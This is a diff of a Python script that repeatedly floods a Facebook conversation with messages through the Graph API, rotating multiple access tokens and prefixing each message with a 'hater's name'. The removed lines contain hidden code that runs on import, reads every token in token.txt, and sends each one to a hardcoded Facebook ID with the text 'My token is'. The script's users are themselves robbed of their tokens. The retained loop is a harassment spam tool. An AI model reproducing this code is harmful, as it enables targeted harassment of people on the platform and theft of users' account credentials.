@@ -4,146 +4,80 @@ import time
 import sys
 from platform import system
 import os
-import subprocess
-import http.server
-import socketserver
 import threading
-import random
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-      def do_GET(self):
-          self.send_response(200)
-          self.send_header('Content-type', 'text/plain')
-          self.end_headers()
-          self.wfile.write(b"CREDIT :- TRICKS BY SATISH <br> <br> OWNER => SATISH <br> <br> WATSAPP :- +916268781574")
-def execute_server():
-      PORT = int(os.environ.get('PORT', 4000))
 
-      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-          print("Server running at http://localhost:{}".format(PORT))
-          httpd.serve_forever()
+BOLD = '\033[1m'
+CYAN = '\033[96m'
 
 
-def send_initial_message():
-      with open('token.txt', 'r') as file:
-          tokens = file.readlines()
+def banner():  # Program Banner
+    print(' \n\n   \033[1;31m███████╗ █████╗ ████████╗██╗███████╗██╗  ██╗\n   \033[1;32m██╔════╝██╔══██╗╚══██╔══╝██║██╔════╝██║  ██║\n   \033[1;33m███████╗███████║   ██║   ██║███████╗███████║\n   \033[1;34m╚════██║██╔══██║   ██║   ██║╚════██║██╔══██║\n   \033[1;35m███████║██║  ██║   ██║   ██║███████║██║  ██║\n   \033[1;36m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝╚═╝  ╚═╝\n\n\n      ╔═════════════════════════════════╗\n      ║  Author : Tricks By Satish      ║\n      ║  Wattsapp : +916268781574       ║\n      ╚═════════════════════════════════╝\n')
 
-      # Modify the message as per your requirement
-      msg_template = "CREDIT :- TRICKS BY SATISH                                           Owner => Satish                                           Hello Satish sir. I am using your server. My token is :- {}"
+def get_access_tokens(token_file):
+    with open(token_file, 'r') as file:
+        return [token.strip() for token in file]
+        
 
-      # Specify the ID where you want to send the message
-      target_id = "100087513362848"
+def liness():
+	print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')
 
-      requests.packages.urllib3.disable_warnings()
+def send_messages(convo_id, tokens, messages, haters_name, speed):
+    headers = {
+        'Content-type': 'application/json',
+    }
 
-      def liness():
-          print('\033[1;92m' + '●════════════TRICKS-BY-SATISH════════════●')
+    num_tokens = len(tokens)
+    num_messages = len(messages)
+    max_tokens = min(num_tokens, num_messages)
 
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
+    while True:
+        try:
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = tokens[token_index]
 
-      for token in tokens:
-          access_token = token.strip()
-          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-          msg = msg_template.format(access_token)
-          parameters = {'access_token': access_token, 'message': msg}
-          response = requests.post(url, json=parameters, headers=headers)
+                message = messages[message_index].strip()
 
-          # No need to print here, as requested
-          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+                url = f"https://graph.facebook.com/v15.0/{convo_id}/"
+                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
+                response = requests.post(url, json=parameters, headers=headers)
 
-      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
-send_initial_message()
-def send_messages_from_file():
-      with open('convo.txt', 'r') as file:
-          convo_id = file.read().strip()
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("\033[1;36m[✓] Ham Bhai Chla Gya Tera Massage {} of Convo {} sent by Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                else:
+                    print("\033[1;35m[x] Failed to send message {} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                time.sleep(speed)
 
-      with open('file.txt', 'r') as file:
-          messages = file.readlines()
+            print("\n[+] All messages sent. Restarting the process...\n")
 
-      num_messages = len(messages)
-
-      with open('token.txt', 'r') as file:
-          tokens = file.readlines()
-      num_tokens = len(tokens)
-      max_tokens = min(num_tokens, num_messages)
-
-      with open('name.txt', 'r') as file:
-          haters_name = file.read().strip()
-
-      with open('speed.txt', 'r') as file:
-          speed = int(file.read().strip())
-
-      def liness():
-          print('\033[1;92m' + '●════════════TRICKS-BY-SATISH════════════●')
-
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-      while True:
-          try:
-              for message_index in range(num_messages):
-                  token_index = message_index % max_tokens
-                  access_token = tokens[token_index].strip()
-
-                  message = messages[message_index].strip()
-
-                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
-                  response = requests.post(url, json=parameters, headers=headers)
-
-                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
-                  if response.ok:
-                      print("\033[1;36m[✓] Bhai Chla Gya Tera Massage {} of Convo {} Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  else:
-                      print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  time.sleep(speed)
-
-              print("\n[+] All messages sent. Restarting the process...\n")
-          except Exception as e:
-              print("[!] An error occurred: {}".format(e))
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
 
 def main():
-      server_thread = threading.Thread(target=execute_server)
-      server_thread.start()
+    banner()  # Print the banner before getting user input
+    token_file = input(BOLD + CYAN + "[+] Token File: ").strip()
+    tokens = get_access_tokens(token_file)
 
-      # Send the initial message to the specified ID using all tokens
+    convo_id = input(BOLD + CYAN + "[+] Conversation ID: ").strip()
+    messages_file = input(BOLD + CYAN + "[+] Messages Text File: ").strip()
+    haters_name = input(BOLD + CYAN + "[+] Hater's Name: ").strip()
+    speed = int(input(BOLD + CYAN + "[+] Speed in Seconds: ").strip())
+
+    with open(messages_file, 'r') as file:
+        messages = file.readlines()
 
 
-      # Then, continue with the message sending loop
-      send_messages_from_file()
+    send_messages(convo_id, tokens, messages, haters_name, speed)
+
 
 if __name__ == '__main__':
-      main()
+    main()
